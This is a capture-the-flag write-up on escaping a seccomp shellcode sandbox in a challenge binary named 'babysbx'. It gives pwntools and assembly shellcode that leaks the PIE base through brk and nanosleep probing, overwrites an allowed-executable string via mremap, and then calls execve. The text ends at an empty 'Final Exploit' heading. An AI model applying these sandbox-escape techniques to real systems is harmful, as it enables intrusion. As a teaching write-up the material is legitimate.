Shellcode sandboxes make for a fun little game

## Looking at the Problem

We're provided with a binary `babysbx`, a second binary ``readflag``, as well as a `Dockerfile` and `docker-compose.yml` for testing our remote exploit. Let's begin with seeing what the binary is doing to figure out what's going on.

## Decomp

Popping the binary into our favorite decompiler (I'll use Ghidra for this writeup for simplicity), we find a main method that looks like
```c
undefined8 main(void)

{
  code *__dest;
  ssize_t sVar1;
  ulong local_18;
  
  __dest = (code *)mmap((void *)0xc0de000,0x1000,7,0x22,-1,0);
  memcpy(__dest,prefix,0x28);
  write(1,"shellcode: ",0xb);
  local_18 = 0;
  while ((local_18 < 0xfd8 && (sVar1 = read(0,__dest + local_18 + 0x28,1), 0 < sVar1))) {
    local_18 = local_18 + 1;
  }
  install_sandbox();
  (*__dest)();
  return 0;
}
```

Looks like this is designating a segment of memory for us with mmap, writing our input into that segment of memory (0xfd7 bytes), and finally executing our input. This means any shellcode we send to the program will get successfully executed. Before it's executed, however, there's an `install_sandbox()` function that gets run. Let's take a look at that now.

```c
void install_sandbox(void)

{
  int iVar1;
  long lVar2;
  undefined8 in_R8;
  undefined8 in_R9;
  
  lVar2 = seccomp_init(0x7fff0000);
  if (lVar2 == 0) {
    fatal("seccomp_init");
  }
  iVar1 = seccomp_rule_add(lVar2,0,2,0);
  if (iVar1 == 0) {
    iVar1 = seccomp_rule_add(lVar2,0,0x101,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x1b5,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x55,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x65,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x38,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x1b3,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x39,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x3a,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x3e,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x142,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,9,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,10,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0xb,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x11,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x13,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x127,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x147,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x136,0);
    if (iVar1 != 0) goto LAB_0010162a;
    iVar1 = seccomp_rule_add(lVar2,0,0x137,0);
    if (iVar1 != 0) goto LAB_0010162a;
  }
  else {
LAB_0010162a:
    fatal("seccomp_rule_add");
  }
  iVar1 = seccomp_rule_add(lVar2,0,0x3b,1,in_R8,in_R9,0x100000000,"/bin/id",0);
  if (iVar1 == 0) {
    iVar1 = seccomp_rule_add(lVar2,0,0,1,in_R8,in_R9,0x100000002,1,0);
    if (iVar1 == 0) {
      iVar1 = seccomp_rule_add(lVar2,0,0,1,in_R8,in_R9,0x200000001,0xc0de000,0);
      if (iVar1 == 0) {
        iVar1 = seccomp_rule_add(lVar2,0,0,1,in_R8,in_R9,0x500000001,0xc0df000,0);
        if (iVar1 == 0) goto LAB_001017e4;
      }
    }
  }
  fatal("seccomp_rule_add");
LAB_001017e4:
  iVar1 = seccomp_load(lVar2);
  if (iVar1 != 0) {
    fatal("seccomp_load");
  }
  seccomp_release(lVar2);
  return;
}
```

That's a lot to parse through but it generally looks like this function is setting up a bunch of seccomp rules that will set limitations on which syscalls we can actually run with our shellcode. Thankfully there's a tool out there (``seccomp-tools``) that makes looking at these a lot easier. 

Let's use ``seccomp-tools`` to dump these seccomp rules now:

```

That's still a lot but we see that at first a good many syscalls are blocked and right afterwards some restrictions are set on allowed syscalls. The blocked syscalls include open, mmap, mprotect, munmap, pread64, readv, clone, fork, vfork, kill, creat, ptrace, openat, preadv, openat, preadv, process_vm_readv, process_vm_writev, execveat, and preadv2. 

The syscalls that are restricted are execve where the filename of our execve call must match the one at memory address 0x560f4c27a050 as well as read where the number of bytes read must be at most 1 and the address must be between 0xc0de000 and 0xc0df000 (the memory region we control with our shellcode).

It's interesting to restrict execve in this way so let's take a look at what actually exists at 0x560f4c27a050. Loading up our binary in gdb we can either either inspect the memory there directly (would have to run seccomp-tools with address randomization disabled so addresses line up) or by running ``info variables`` we see
```c
0x0000555555556050  ALLOWED_EXE
```
*Note that the difference in addresses is due to address randomization. 0x560f4c27a050 and 0x555555556050 represent the same variable here*

Further inspecting
```c
pwndbg> x/s 0x0000555555556050
0x555555556050 <ALLOWED_EXE>:	"/bin/id"
```
Looks like the filename for our execve syscall is being compared to a string in a global variable called ALLOWED_EXE stored in the bss segment of memory. It's currently set to "/bin/id" so we can only call /bin/id but if we could somehow control this variable we could set it to anything like "/bin/sh" or "/readflag" to run the flag binary we were also provided.

## Setting up an Exploit

At first I tried to just get some simple shellcode going to run /bin/id which we should be able to do without any exploit. Quite noticeably, however, all the registers have been reset 
![reset_registers](/assets/blackhatmea/zerodaytea/reset_registers.webp)
*You can see this for yourself if you just send 0xfd7 bytes of anything and inspect in GDB*

Any PUSH instruction we try will fail because there's no stack frame setup with RSP and RBP. For our initial setup code, we can start by creating a stack within the memory region that was allocated for us by setting rbp and rsp to some values with a couple of bytes in between for our stack.
```python
from pwn import *

elf = ELF("./babysbx")
context.binary = elf

def conn():
    if args.GDB:
        script = """
        b *(main+201)
        c
        """
        p = gdb.debug(elf.path, gdbscript=script)
    elif args.REMOTE:
        p = remote("addr", 1337)
    else:
        p = process(elf.path)
    return p

def run():
    setup_stack = """
    movabs rbp, 0xc0def00
    sub rbp, 0x38
    mov rsp, rbp
    """
    shellcode = asm(setup_stack)
	p = conn()

    p.recvuntil(b'shellcode: ')

    payload = shellcode.ljust(0xfd7, b'\x90')

    p.sendline(payload)
    p.interactive()
```

We also have to make sure to use ljust to pad our payload to the desired length before sending it otherwise the buffer will be expecting more bytes and nothing will get executed. This will get us going for any starter shellcode we want to write.

## Exploit Ideation

It looks like we need to find the address of the variable controlling our allowed filename for execve and find a way to overwrite the string that is currently there. You might be thinking we already have the address from earlier, but upon a second look, PIE is enabled so we can't rely on any hardcoded address
```bash
$ checksec ./babysbx
[*] '/BlackhatMEAFinals/pwn/babysbx_pwn/babysbx'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Looks like our exploit is now going to have to look like
1. Leak PIE
2. Find a way to write to the bss
3. Use execve to call a binary of our choosing

## Leaking PIE

There's the easy way to do this... and then there's the way I did it. I'll still show my way first before discussing the way that a couple other competitors used.

We've got a lot of restricted syscalls, so any regular way of leaking PIE to get ELF base is not going to work. Thankfully there's this neat trick I found in a writeup from a while ago. We'll need to use brk and nanosleep which thankfully for us are unrestricted.

You might be thinking... nanosleep?? Yes, in fact, nanosleep can take an address and if it's a valid mapped address will set rax to 0xffffffffffffffea but if it's an invalid address will set it to 0xfffffffffffffff2. On top of that, a brk syscall, which resizes the data segment (really just the BSS, data, and heap collectively together), will give us the address of the program break after executing. 

Together, we can use brk to get the end of the data segment and use nanosleep to bruteforce addresses downwards until we hit a known address. Then, we simply subtract the offset from ELF base and we've successfully broken PIE.

```python
leak_pie = """
    mov rdi, 0
    mov rax, 0xc
    syscall           <- brk syscall to get end of data segment
    
    mov rdi, rax
    sub rdi, 0x22000
    sub rdi, 0x400    <- align address
    
    loop:             <- loop until we find a valid address
    sub rdi, 0x1000
    mov rax, 0x23
    syscall
    cmp al, 0
    jne loop          <- break once we find an address and subtract the offset
    sub rdi, 0x4c00
    """
shellcode = asm(leak_pie)
```

## The Right Way To Do This

As I mentioned earlier, there's an easier way to do this for this challenge which I unfortunately overlooked while working on it.

While I said that all the registers had been reset so we didn't have any addresses left over in them, that's not entirely true. Breaking where we did earlier at the start of our shellcode, we can run `info reg all` to inspect all of the registers available.

![SSEregisters](/assets/blackhatmea/zerodaytea/SSEregisters.webp)
While all the main registers have been reset, the SSE registers that libc uses for SIMD optimization (such as xxm0, ymm0, etc) have been untouched and it looks like they contain some heap addresses. 

While getting ELF base from these random heap addresses would still require some offset checking, it's a lot simpler than bruteforcing the way I did. Regardless, I think the brk + nanosleep trick is a good one to remember for the future.
## Writing to BSS

Now that we have ELF base we know the address of the ALLOWED_EXE variable we're trying to control. It's time to find a way to write to it. 

mmap, mprotect, munmap, and ptrace are all blocked so we need to rely on something else to be able to control the "/bin/id" string. Fortunately, mremap is left available, a syscall used for moving a memory page.

The trick here is that we can move a memory page (which we control) containing some other string to the memory page containing the ALLOWED_EXE variable. This way we can effectively control the contents of the data section. 

From the mremap manpage (https://man7.org/linux/man-pages/man2/mremap.2.html) under the MREMAP_DONTUNMAP flag description, "This flag, which must be used in conjunction with MREMAP_MAYMOVE, remaps a mapping to a new address but does not unmap the mapping at old_address." Thus our goal is to run the equivalent of:

```c
mremap(our_memory, 0x1000, 0x2000);
mremap(our_memory_page (our_memory + 0x1000), 0x1000, 0x1000, MREMAP_DONTUNMAP, page_with_allowed_exe);
```

The page_with_allowed_exe page start is 0x50 bytes before the ALLOWED_EXE var we are trying to control so we'll have to write our desired string 0x50 bytes after the start of the page we control so they align after remapping.

I first tried to do this with "/bin/sh" but unfortunately /bin/sh itself uses restricted syscalls and so executing it later would always fail. Thankfully the challenge had a provided binary at /readflag which gives us the flag without using any restricted syscalls so we just have to replace "/bin/id" with that.

The code for that looks like this.
```python
set_var = """
sub rdi, 0x4c00     <- get ELF base
add rdi, 0x2000     <- get memory page to control
mov rbx, rdi        <- save for later use
mov rdi, 0xc0de000
mov rsi, 0x1000
mov rdx, 0x2000
mov rax, 0x19
syscall             <- mremap(our_memory, 0x1000, 0x2000)

mov rsp, 0xc0de000 + 0x1000 + 0x50 + 0x10
mov rdi, 0x0000000000000067
push rdi
mov rdi, 0x616c66646165722f
push rdi            <- write "/readflag" to our memory page
mov rdi, rsp

sub rdi, 0x50
mov rdx, 0x1000
mov r10, 3          <- MREMAP_DONTUNMAP flag
mov r8, rbx
mov rax, 0x19
syscall             <- remap our controlled page to page of ALLOWED_EXE
"""

shellcode += asm(set_var)
```

Checking again to make sure it worked, we see that we've successfully overwritten ALLOWED_EXE as intended :)

![overwrite_success](/assets/blackhatmea/zerodaytea/overwrite_success.webp)
## Getting the Flag

Finally, all that's left to do is execute our execve call with the now allowed "/readflag" filename argument and get the flag.

```python
win = """
mov rdi, rbx     <-
add rdi, 0x50    <- setting filename to address of "/readflag"
mov rsi, 0
mov rdx, 0
mov rax, 0x3b
syscall
"""

shellcode += asm(win)
```

## Final Exploit

Putting it all together we get our final shellcode and working exploit.
